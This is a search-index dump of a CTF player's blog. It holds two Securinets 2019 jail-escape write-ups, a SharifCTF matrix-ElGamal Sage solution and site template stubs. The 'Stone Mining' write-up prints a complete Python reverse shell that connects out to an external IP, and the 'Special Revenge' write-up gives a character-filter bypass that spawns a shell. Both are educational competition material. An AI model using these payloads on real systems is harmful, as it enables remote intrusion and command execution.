[{"authors":["admin"],"categories":null,"content":"My name is Bilal Retiat, studing computer science at ESI-SBA, solving problems at HackerRank, doing challenges at Root-me.\nI skip school to participate in CTFs.\n","date":-62135596800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://philomath213.github.io/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"My name is Bilal Retiat, studing computer science at ESI-SBA, solving problems at HackerRank, doing challenges at Root-me.\nI skip school to participate in CTFs.","tags":null,"title":"Bilal Retiat","type":"authors"},{"authors":[],"categories":null,"content":" Click on the Slides button above to view the built-in slides feature.   Slides can be added in a few ways:\n Create slides using Academic\u0026rsquo;s Slides feature and link using slides parameter in the front matter of the talk file Upload an existing slide deck to static/ and link using url_slides parameter in the front matter of the talk file Embed your slides (e.g. Google Slides) or presentation video on this page using shortcodes.  Further talk details can easily be added to this page using Markdown and $\\rm \\LaTeX$ math code.\n","date":1906549200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1906549200,"objectID":"96344c08df50a1b693cc40432115cbe3","permalink":"https://philomath213.github.io/talk/example/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/talk/example/","section":"talk","summary":"An example talk using Academic's Markdown slides feature.","tags":[],"title":"Example Talk","type":"talk"},{"authors":null,"categories":null,"content":" Securinets CTF Quals 2019 - Special Revenge WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Special Revenge PWN 1000 5    Description  After the disappointment of last year challenge \u0026ldquo;special\u0026rdquo;, I came this year with a mystery revenge.\nssh special@51.254.114.246\npassword : b8f07e1000c719c6a7febde4ec0ab24d\nAuthor : Anis_Boss\n Another jail escape challenge, we were provided with ssh login (username special).\nAfter being logged in to the server we will get this welcome message, and a prompt where we can type our command.\n================================ Welcome to Special Revenge ================================ || ||\u0026lt;(.)\u0026gt;||\u0026lt;(.)\u0026gt;|| || || _|| || ||_ || || (__D || C__) || || (__D || C__) || || (__D || C__) || || (__D || C__) || || || || || || ================================ Securinets - Quals ================================ \u0026gt;\u0026gt;  As expected we can execute the usual command in this very restricted shell (ls, cat, id), also we didn\u0026rsquo;t get any error message by typing these commands.\n\u0026gt;\u0026gt; ls \u0026gt;\u0026gt; id \u0026gt;\u0026gt; cat /etc/passwd \u0026gt;\u0026gt; echo helloooooo  I tried to escape this jail by sending interrupt signal (CTRL+Z) since this a ssh session, and I got this message \u0026quot;Hemm, nice one but you can't escape\u0026quot;, it seems that signal handler are altered by the jail script.\nThen I typed all alphanumeric characters to see if there any filters or a whitelist for words/characters, and got this very helpful error message.\n\u0026gt;\u0026gt; 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ./mystery.sh: line 29: 1: command not found  which means that all the alphanumeric charset is filtered except 1 (1: command not found), and the jail script is executing the filter input at the end.\nI also did some tests to see if there are any allowed special characters, because with only 1 there are no way to escape this jail, each time I put 1 at the beginning and at the end and see what left between them.\n\u0026gt;\u0026gt; 1~`/;@#1 ./mystery.sh: line 29: 1#1: command not found  This means that ~`/;@ are filtered while # is allowed.\nAfter few attempts, I figure out that only these characters are allowed 1\u0026lt;\\\u0026quot;#$'(){}\nSo how can we escape this jail using just these 11 chars !!!!.\nObjective Our objective is escaping this jail, How ??, by executing /bin/sh or just sh for short to spawn a shell, or by typing break to break the loop, \u0026hellip;\nthe easiest one is spawning a shell by executing the sh command, so we need to build the sh string using the allowed characters.\nOur Arsenal Despite the fact that all alphabetic are filtered, we have quit a few tricks at our disposal that we can use to build any command.\n$# # number of arguments, evaluates as 0 in this case $((expr)) # evaluate an arithmetic expression $'\\116' # convert octal to a character in string literal  The 1st trick: $# evaluates as 0\n\u0026gt;\u0026gt; $# ./mystery.sh: line 29: 0: command not found  So we have 1 and 0 in our hands, what come in my mind first was binary, since everything is built upon binary we can for sure build anything using these two lovely characters.\nThe 2nd trick: $((expr)) will evaluate the arithmetic expression expr and return the result.\n#examples $ echo $((1+1)) # addition 2 $ echo $((6-1)) # subtraction 5 $ echo $((2*3)) # multiplication 6 $ echo $((6/2)) # division 3 $ echo $((2\u0026lt;\u0026lt;4)) # shift left 32 $ echo $((32\u0026gt;\u0026gt;4)) # shift right 2 $ echo $((2#1010)) # convert binary value to decimal 10  The last one is what we need, but we don\u0026rsquo;t have the character 2.\nFortunately we can get 2 just by shifting left 1 by one bit\n$ echo $((1\u0026lt;\u0026lt;1)) 2  # $((1\u0026lt;\u0026lt;1)) =\u0026gt; 2 # $# =\u0026gt; 0 # $(($((1\u0026lt;\u0026lt;1))#1$#1$#)) =\u0026gt; $((2#1010)) =\u0026gt; 10 echo $(($((1\u0026lt;\u0026lt;1))#1$#1$#)) 10  The 3rd trick, $'\\116' convert the octal value 116 to a character N in string literal.\n$ echo $'\\163'$'\\150' sh  Remark I noticed that the input will be evaluate recursively twice, something like eval(eval(INPUT)).\nWhen I run \\$\\'\\\\1$#1\\' in my bash I get this:\n$ \\$\\'\\\\1$#1\\' bash: $'\\101': command not found  but when running the same input in the jail, I get this:\n\u0026gt;\u0026gt; \\$\\'\\\\1$#1\\' /opt/mystery.sh: line 29: A: command not found  Putting the Pieces Together \\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#1$#$#$#11))\\'\\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#$#1$#11$#))\\' # 1st evaluation =\u0026gt; \\$\\'\\\\$((2#10100011))\\'\\$\\'\\\\$((2#10010110))\\' =\u0026gt; \\$\\'\\\\163\\'\\$\\'\\\\150\\' =\u0026gt; $'\\163'$'\\150' # 2nd evaluation =\u0026gt; sh  \u0026gt;\u0026gt; \\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#1$#$#$#11))\\'\\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#$#1$#11$#))\\' $ id uid=1015(special) gid=1015(special) groups=1015(special) $ ls -la total 28 dr-xr-xr-x 2 special special 4096 Mar 22 02:02 . drwxr-xr-x 22 root root 4096 Mar 24 10:18 .. -rw-r--r-- 1 special special 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 special special 3771 Sep 1 2015 .bashrc -rw-r----- 1 root special 47 Mar 22 02:02 flag.txt -rw-r-x--- 1 root special 752 Mar 22 01:55 mystery -rw-r--r-- 1 special special 655 May 16 2017 .profile $ cat flag.txt securinets{bash_never_stop_from_being_awesome}  Conclusion Jail challenges are always painful at the beginning, so they require more patient than usual challenges. A good understanding of the shell environment and built-ins can be handful in scenarios like this one.\nFLAG: securinets{bash_never_stop_from_being_awesome}\n","date":1553511579,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1553511579,"objectID":"af34e38bf5839daefc3098e12229d057","permalink":"https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/","publishdate":"2019-03-25T11:59:39+01:00","relpermalink":"/post/securinets-ctf-quals-2019-special-revenge/","section":"post","summary":"Securinets CTF Quals 2019 - Special Revenge WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Special Revenge PWN 1000 5    Description  After the disappointment of last year challenge \u0026ldquo;special\u0026rdquo;, I came this year with a mystery revenge.\nssh special@51.254.114.246\npassword : b8f07e1000c719c6a7febde4ec0ab24d\nAuthor : Anis_Boss\n Another jail escape challenge, we were provided with ssh login (username special).","tags":null,"title":"Securinets CTF Quals 2019 Special Revenge","type":"post"},{"authors":null,"categories":null,"content":" Securinets CTF Quals 2019 - Stone Mining WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Stone Mining PWN 1000 4    Description  I went inside a mine thinking it was safe, but got stuck. Help me out.\nService is running at: nc 52.17.200.40 4000\nAuthor: bibiwars\n A jail escape challenge this time, with no prompt, probably a shell jail.\nJail - Stone Mining Objective is to read 'flag' file from the current directory ___________________________________________________________  we can start by executing some random commands:\nshell: id, echo foobar, whoami \u0026hellip;\npython: print(\u0026ldquo;foobar\u0026rdquo;), dir() \u0026hellip;\n\u0026hellip;\nid Not today, some blacklisted caracter has been used echo foobar Not today, some blacklisted caracter has been used print(\u0026quot;foboar\u0026quot;) Not today, some blacklisted caracter has been used dir() Not today, some blacklisted caracter has been used  We got only one message \u0026ldquo;Not today, some blacklisted caracter has been used\u0026rdquo;, which means that there are some blacklisted chars.\na Not today, some blacklisted caracter has been used b Command executed :D c Not today, some blacklisted caracter has been used d Command executed :D e Command executed :D f Not today, some blacklisted caracter has been used 0 Not today, some blacklisted caracter has been used 1 Not today, some blacklisted caracter has been used 2 Not today, some blacklisted caracter has been used 3 Not today, some blacklisted caracter has been used  As we can see, at least there some allowed chars.\nAfter some testing I found that these ascii lower case chars are allowed\nertyuopdghbn  There are other allowed chars, but I used only these char to escape the jail.\nSo how can we bypass that ?\nI first noticed that we can use \u0026ldquo;python\u0026rdquo; word since all its chars are allowed.\nI made an attempt to print to stdout, but didn\u0026rsquo;t get any output\n$ nc 52.17.200.40 4000 Jail - Stone Mining Objective is to read 'flag' file from the current directory ___________________________________________________________ python print('foobar') exit() ^C  So, I made an assumption that stdout, and stderr are closed, or filtered. Therefore, I attempt to connect to the outside using python sockets.\nI start a listener on my host and connect to it.\nRemote Host:\n$ nc 52.17.200.40 4000 Jail - Stone Mining Objective is to read 'flag' file from the current directory ___________________________________________________________ python import socket s = socket.socket() s.connect(('41.102.162.29', 2130)) s.send(b'test\\n') ^C  My host:\nnc -vvntlp 2130 Listening on any address 2130 (xds) Connection from 41.102.162.29:39198 test Total received bytes: 5 Total sent bytes: 0  So it works fine, after closing the connection (CTRL+C to close netcat).\nPutting the Pieces Together The goal is getting reverse shell.\nFirst, Run the python interpreter.\npython  Then copy/past the payload there, the script won\u0026rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.\nimport subprocess cmd = [\u0026quot;python\u0026quot;,\u0026quot;-c\u0026quot;,'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026quot;41.102.162.29\u0026quot;,2130)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'] subprocess.Popen(cmd)  I used \u0026ldquo;subprocess.Popen\u0026rdquo; and run the \u0026ldquo;python -c\u0026rdquo;, to spawn a new background process, in order to avoid killing the process after closing the connection. we won\u0026rsquo;t see any output in this jail, but you will get a reverser shell.\n$ nc -vvntlp 2130 Listening on any address 2130 (xds) Connection from 41.102.162.29:39190 $ id uid=999(ctf) gid=999(ctf) groups=999(ctf) $ ls -la total 12 drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 . drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 .. -rwxr-x--- 1 root ctf 59 Mar 23 04:17 flag $ cat flag c2VjdXJpbmV0c3szODExMjc5Zjg4M2JkM2Q3ZWFkZjU3NmNlY2Y4ZDVjYn0$ $ cat flag | base64 -d securinets{3811279f883bd3d7eadf576cecf8d5cb} $  Jails could be escaped taking various ways.\nI\u0026rsquo;m not sure if the solution I come to is the intended one.\nFLAG: securinets{3811279f883bd3d7eadf576cecf8d5cb}\n","date":1553450446,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1553450446,"objectID":"331987ca913bff49ed26b3aaf4bec034","permalink":"https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/","publishdate":"2019-03-24T19:00:46+01:00","relpermalink":"/post/securinets-ctf-quals-2019-stone-mining/","section":"post","summary":"Securinets CTF Quals 2019 - Stone Mining WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Stone Mining PWN 1000 4    Description  I went inside a mine thinking it was safe, but got stuck. Help me out.\nService is running at: nc 52.17.200.40 4000\nAuthor: bibiwars\n A jail escape challenge this time, with no prompt, probably a shell jail.","tags":null,"title":"Securinets CTF Quals 2019 Stone Mining","type":"post"},{"authors":[],"categories":[],"content":" Welcome to Slides Academic\nFeatures  Efficiently write slides in Markdown 3-in-1: Create, Present, and Publish your slides Supports speaker notes Mobile friendly slides  Controls  Next: Right Arrow or Space Previous: Left Arrow Start: Home Finish: End Overview: Esc Speaker notes: S Fullscreen: F Zoom: Alt + Click PDF Export: E  Code Highlighting Inline code: variable\nCode block:\nporridge = \u0026quot;blueberry\u0026quot; if porridge == \u0026quot;blueberry\u0026quot;: print(\u0026quot;Eating...\u0026quot;)  Math In-line math: $x + y = z$\nBlock math:\n$$ f\\left( x \\right) = \\;\\frac{{2\\left( {x + 4} \\right)\\left( {x - 4} \\right)}}{{\\left( {x + 4} \\right)\\left( {x + 1} \\right)}} $$\nFragments Make content appear incrementally\n{{% fragment %}} One {{% /fragment %}} {{% fragment %}} **Two** {{% /fragment %}} {{% fragment %}} Three {{% /fragment %}}  Press Space to play!\nOne  Two  Three \nA fragment can accept two optional parameters:\n class: use a custom style (requires definition in custom CSS) weight: sets the order in which a fragment appears  Speaker Notes Add speaker notes to your presentation\n{{% speaker_note %}} - Only the speaker can read these notes - Press `S` key to view {{% /speaker_note %}}  Press the S key to view the speaker notes!\n Only the speaker can read these notes Press S key to view   Themes  black: Black background, white text, blue links (default) white: White background, black text, blue links league: Gray background, white text, blue links beige: Beige background, dark text, brown links sky: Blue background, thin dark text, blue links   night: Black background, thick white text, orange links serif: Cappuccino background, gray text, brown links simple: White background, black text, blue links solarized: Cream-colored background, dark green text, blue links  Custom Slide Customize the slide style and background\n{{\u0026lt; slide background-image=\u0026quot;/img/boards.jpg\u0026quot; \u0026gt;}} {{\u0026lt; slide background-color=\u0026quot;#0000FF\u0026quot; \u0026gt;}} {{\u0026lt; slide class=\u0026quot;my-style\u0026quot; \u0026gt;}}  Custom CSS Example Let\u0026rsquo;s make headers navy colored.\nCreate assets/css/reveal_custom.css with:\n.reveal section h1, .reveal section h2, .reveal section h3 { color: navy; }  Questions? Ask\nDocumentation\n","date":1549324800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1549324800,"objectID":"0e6de1a61aa83269ff13324f3167c1a9","permalink":"https://philomath213.github.io/slides/example/","publishdate":"2019-02-05T00:00:00Z","relpermalink":"/slides/example/","section":"slides","summary":"An introduction to using Academic's Slides feature.","tags":[],"title":"Slides","type":"slides"},{"authors":null,"categories":null,"content":" Sharif CTF 8 - ElGamat WriteUp Challenge details    Event Challenge Category Points     Sharif CTF 8 ElGamat Crypto 200    Description  ElGamal over Matrices: algebra-focused crypto challenge\nyou can find full description in ElGamat.pdf\n Attachments  Matrices.txt\n Solution This problem appears to be similar to the discrete logarithm problem (see Discrete logarithm), but instead of the generator g we a have a matrix \\(G\\), So we need to find \\(x\\) such that \\(G^x = H\\) (both \\(G\\) and \\(H\\) are \\(5\\times5\\) Matrices).\nMatrices =\u0026gt; Linear Algebra: this challenge requires some fundamentals in linear algebra.\nAt the beginning I tried to diagonalize the matrix \\(G\\) and \\(H\\) in order to transform the problem to a discrete logarithm problem, but it will stay hard to solve since \\(p-1\\) is not a product of small primes which in this case Pohlig–Hellman algorithm is not an efficient method for computing the discrete logarithms.\nAfter doing some googling I figure out that in order to make this problem easy to solve we need to put both Matrices \\(G\\) and \\(H\\) in Jordan normal form (see Jordan normal form)\nA Jordan matrix has each non-zero off-diagonal entry equal to \\(1\\), immediately above the main diagonal.\nfor A a Jordan block as \\(2\\times2\\) matrix, if we have a repeated eigenvalues:\n$$ A = \\begin{pmatrix} \\lambda \u0026amp; 1 \\\\ 0 \u0026amp; \\lambda \\end{pmatrix} $$ for \\(B = A^x\\): $$ B = \\begin{pmatrix} \\lambda^x \u0026amp; x\\lambda^{x-1} \\\\ 0 \u0026amp; \\lambda^x \\end{pmatrix} $$\n$$x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}.$$\ntherefore in this case: $$ B{12} = xB{11}A{11}^{-1} \\iff x = A{11}B{12}B{11}^{-1} $$\nNow we need to apply this solution to ElGamat problem\nIn our case \\(G[3][3]\\) to \\(G[4][4]\\) is a Jordan block with repeated eigenvalues, and all arithmetic operations are in Quotient Ring \\(Z/Z_p\\)\nthis is my code in sage (ElGamat.sage):\nimport hashlib p = 1461501637330902918203684832716283019655932542983 G = [ [1287397632974625907369332145667695136576732725719, 999149001044306271168727399637009399486427921379, 1046504160269652701583906344218556291030141088947, 724446625683754938181565321149725788430461092168, 1071845980147173642753960259602135592110139561915], [947603660931904341080240982051313712707367037453, 312289846563741934103580532543082761760226637905, 494739786803547247505263837170488583876166831850, 680540462980071181450018491798299105995449257198, 2602258415762368797405060707505977243346704576], [996213673531855992829525358578006610606634622631, 1025711294257038288640877971869685565227647136954, 1432432135773706484846126533752827108541355741973, 1238541870126055576875033883691918425137600727481, 1130938956963588695293783764965618873887596017827], [1320933266015680090206505704792362493057963931979, 1151746112645644166669332171392580649376526147475, 117512451110908867093773368598681106589771485221, 78071463743800894350883457304401524272336187149, 350437511649326676405126284689545814008237687775], [438339253001275654203062260777687750937184662400, 372483950165136927369598298270629892810999203086, 859008773869616460027135965589262417694174453098, 1174526536643808668299968641952541506024584582818, 13201859260259503932772826643483081858286638179] ] H = [ [903022231855038558383593109888227525558007552960, 565977275270298825053282757799743346899236483368, 989303675765663596792169321947495382568831693037, 601579288654704389384765634776493921679315260303, 913791750749394879333717884106841876340654737006], [1159121456278955861257379214176694847802842944213, 55304385436577133507085707981392660143782780650, 559867756424853909301288957105188829240808301823, 1230859641388132364539374469026906952870988170695, 1423995124592695628047882256427827379994877406997], [1125565199147204322161069021173152827232960621114, 1373772036013472137002755957284397215018630262515, 640623873603434273377865546046279663852895430999, 1056809237992218798189986002766547616222871640976, 1426649441470162608512662468308504390861950649943], [303729376872199895471546635639837180361513146712, 1163767872227950278851006729914569662442255257700, 1320342731346163804219021270875175061467772367004, 433001013681018647747911760920686992297849343282, 1149024280460224794070159244078925721991430685838], [23661702916810298505759145354543089608241235601, 1048655828654821525617176122368805879408325508567, 587846047820504813842423941849757078103027466928, 1338365929525105225695097114139069216753339875455, 1425543850003062038868121400064269552725872690214] ] R = IntegerModRing(p) M = MatrixSpace(R, 5, 5) g = M(G) h = M(H) g, p_mat = g.jordan_form(transformation=True) print '[+] jordan normal for G:' for i in g: print i h = p_mat.inverse()*h*p_mat print '[+] jordan normal for H:' for i in h: print i a11 = g[3][3] b11 = h[3][3] b12 = h[3][4] x = a11*b12/b11 assert b12 == x*a11^(x-1) print '[+] solution:', x def flag_gen(alpha): return 'SharifCTF{%s}' % hashlib.md5(str(alpha).encode()).hexdigest() print '[+] FLAG:', flag_gen(x)  ","date":1537996768,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537996768,"objectID":"f0758ea9fe54a9f27a8b76bb9327c10d","permalink":"https://philomath213.github.io/post/sharifctf8_elgamat/","publishdate":"2018-09-26T22:19:28+01:00","relpermalink":"/post/sharifctf8_elgamat/","section":"post","summary":"Sharif CTF 8 - ElGamat WriteUp Challenge details    Event Challenge Category Points     Sharif CTF 8 ElGamat Crypto 200    Description  ElGamal over Matrices: algebra-focused crypto challenge\nyou can find full description in ElGamat.pdf\n Attachments  Matrices.txt\n Solution This problem appears to be similar to the discrete logarithm problem (see Discrete logarithm), but instead of the generator g we a have a matrix \\(G\\), So we need to find \\(x\\) such that \\(G^x = H\\) (both \\(G\\) and \\(H\\) are \\(5\\times5\\) Matrices).","tags":null,"title":"SharifCTF8_ElGamat","type":"post"},{"authors":null,"categories":null,"content":" philomath213: My name is Bilal Retiat, studing computer science at ESI-SBA, solving problems at HackerRank, doing challenges at Root-me.\nI skip school to participate in CTFs.\nInterests: Learning and Reading, CTF, Coding, Reverse Engineering, PWN, Crypto \u0026hellip;\nYou can check out my projects and writings in this blog.\nYou can also find me on social networks and github (the links are in the button of the page)\n","date":1537992681,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537992681,"objectID":"405ba581599f556cd14af94d199e20b1","permalink":"https://philomath213.github.io/page/about/","publishdate":"2018-09-26T21:11:21+01:00","relpermalink":"/page/about/","section":"page","summary":"philomath213: My name is Bilal Retiat, studing computer science at ESI-SBA, solving problems at HackerRank, doing challenges at Root-me.\nI skip school to participate in CTFs.\nInterests: Learning and Reading, CTF, Coding, Reverse Engineering, PWN, Crypto \u0026hellip;\nYou can check out my projects and writings in this blog.\nYou can also find me on social networks and github (the links are in the button of the page)","tags":null,"title":"About","type":"page"},{"authors":null,"categories":null,"content":"","date":1527811200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527811200,"objectID":"fd228902f5183d0e3ae7725fda5acc85","permalink":"https://philomath213.github.io/project/open-class/","publishdate":"2018-06-01T00:00:00Z","relpermalink":"/project/open-class/","section":"project","summary":"OpenClass is a web app that promote information sharing through organized workshops.","tags":["Development"],"title":"OpenClass","type":"project"},{"authors":null,"categories":null,"content":"","date":1496275200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1496275200,"objectID":"7035f80c58e8898fe2e2a1c71001f848","permalink":"https://philomath213.github.io/project/esi-linux/","publishdate":"2017-06-01T00:00:00Z","relpermalink":"/project/esi-linux/","section":"project","summary":"ESI Linux is a linux distribution made for ESI-SBA ( Ecole supérieure d'informatique - Sidi Bel Abbes) students particularly, it provides all the necessary tools for their curriculum.","tags":["Development"],"title":"ESI-LINUX","type":"project"}]